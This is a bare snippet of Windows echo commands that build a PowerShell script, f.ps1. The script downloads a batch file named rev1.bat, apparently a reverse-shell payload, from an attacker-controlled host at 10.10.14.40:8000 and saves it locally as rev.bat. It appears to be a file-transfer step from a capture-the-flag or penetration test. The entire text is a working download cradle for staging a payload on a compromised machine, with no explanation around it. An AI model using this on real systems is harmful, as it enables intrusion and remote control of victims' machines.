echo $webclient = New-Object System.Net.WebClient >> f.ps1
echo $url = "http://10.10.14.40:8000/rev1.bat"  >> f.ps1
echo $file = "rev.bat"  >> f.ps1
echo $webclient.DownloadFile($url,$file) >> f.ps1

